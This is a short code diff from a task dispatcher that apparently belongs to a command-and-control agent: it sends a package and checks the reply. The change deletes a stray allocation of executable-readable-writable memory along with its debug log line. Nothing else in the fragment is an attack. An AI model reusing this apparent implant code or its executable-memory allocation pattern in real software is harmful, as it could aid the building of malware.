@@ -28,9 +28,6 @@ auto DECLFN Task::Dispatcher(
 
     KhDbg( "send %p [%d bytes]", Package->Buffer, Package->Length );
 
-    PVOID Address = Self->Mm->Alloc( NULL, NULL, 0x1000, 0x3000, 0x40 );
-    KhDbg( "allocated memory at %p", Address );
-
     Self->Pkg->Transmit( Package, &DataPsr, &PsrLen );
     KhDbg( "transmited return %p [%d bytes]", DataPsr, PsrLen );
     if ( !DataPsr || !PsrLen ) goto _KH_END;
